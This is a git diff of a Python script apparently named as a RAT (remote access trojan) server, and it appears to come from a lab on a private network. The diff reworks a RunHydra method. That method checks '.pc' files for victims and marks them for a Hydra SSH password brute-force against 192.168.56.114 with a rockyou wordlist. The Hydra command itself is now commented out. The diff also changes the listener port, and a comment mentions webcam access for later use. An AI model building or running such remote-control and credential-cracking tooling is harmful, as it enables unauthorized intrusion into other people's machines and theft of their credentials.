@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, subprocess
+import socket, subprocess, os
 import pyfiglet
 import json
 import base64
@@ -41,10 +41,36 @@ class SERVER:
         file.close()
 
     def RunHydra(self):
-        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.114"],capture_output=True)
-        #print(hResult.stdout)
+        runHydra = False
+        fileList = os.listdir(".")
+        for file in fileList:
+            if file.endswith(".pc"):
+                print ("File: " + file)
+                with open(file) as thisFile:
+                    for line in thisFile:
+                        if 'password' in line or 'Hydra attempted:yes' in line:
+                            print('password or hydra attempt present')
+                            runHydra = False
+                        else:
+                            print('no password or hydra attempt')
+                            runHydra=True
+                            break
+
+                with open(file,'a') as thisFile:
+                    if runHydra == True:
+                        print('run hydra on ' + str(thisFile.name))
+                        thisFile.write('\n'+ "Hydra attempted:yes")
+                        #hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.114"],capture_output=True)
+                        #print(hResult.stdout)
+                        #TODO parse hydra data and write password to file
+
+                    else:
+                        print('do NOT run hydra on ' + str(thisFile.name))    
+
+
 
         
+
 
     
     # setting up function for webcam accessability for later use
@@ -164,7 +190,7 @@ class SERVER:
                     return
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 4445)
+rat = SERVER('0.0.0.0', 4511)
 
 
 
